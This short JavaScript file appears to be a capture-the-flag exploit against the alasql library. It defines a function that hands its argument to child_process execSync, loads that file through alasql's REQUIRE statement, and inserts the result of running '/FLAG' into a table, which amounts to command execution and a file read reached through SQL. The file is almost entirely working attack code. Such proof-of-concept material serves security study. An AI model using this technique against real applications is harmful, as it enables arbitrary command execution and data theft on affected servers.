function executeFile(filename) {
  const { execSync } = require('child_process');
  try {
    return execSync(filename).toString();
  } catch (error) {
    return error.message;
  }
}

const alasql = require('alasql');

alasql('REQUIRE "./execfile.js"');

alasql('CREATE TABLE WOO (content TEXT)');

alasql('INSERT INTO WOO VALUES (executeFile("/FLAG"))');
